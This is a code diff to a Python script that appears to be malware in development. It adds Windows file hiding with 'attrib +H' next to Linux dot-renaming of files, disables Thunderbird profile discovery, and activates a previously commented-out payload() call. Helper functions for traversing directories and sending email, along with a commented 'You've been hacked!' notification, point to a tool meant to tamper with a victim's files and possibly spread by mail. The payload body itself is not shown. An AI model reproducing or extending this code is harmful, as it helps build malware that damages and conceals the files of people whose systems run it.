@@ -23,6 +23,7 @@ import random
 import mimetypes
 import re
 import docx
+import subprocess
 import sqlite3
 from datetime import datetime
 import typing
@@ -87,10 +88,13 @@ def make_file_hidden(filepath: str) -> None:
     
     :filepath: The absolute file path to the file to make hidden.
     """
-    path, name = os.path.split(filepath)
-    name = f".{name}"
-    new_filepath = os.path.join(path, name)
-    os.rename(filepath, new_filepath)
+    if INSTALLED_OS == WINDOWS:
+        subprocess.check_call(["attrib", "+H", filepath])
+    elif INSTALLED_OS == LINUX:
+        path, name = os.path.split(filepath)
+        name = f".{name}"
+        new_filepath = os.path.join(path, name)
+        os.rename(filepath, new_filepath)
 
 
 def traverse_dirs(curr_dir: str) -> None:
@@ -540,6 +544,7 @@ def send_email() -> None:
 if __name__ == "__main__":
     random.seed((datetime.now()).strftime("%H%M%S"))
     
+    """
     # Detect if Thunderbird is installed:
     thunderbird_install_path: str = shutil.which("thunderbird", path=determine_possible_paths())
     print(f"thunderbird_install_path = {thunderbird_install_path}")
@@ -554,7 +559,8 @@ if __name__ == "__main__":
     # Detect all Thunderbird profile directories:
     for elem in find_thunderbird_default_profile_dir():
         print(elem)
+    """
     
-    #payload()
+    payload()
     # send_email()
     #notification("You've been hacked!", message="", app_name="filewriter")
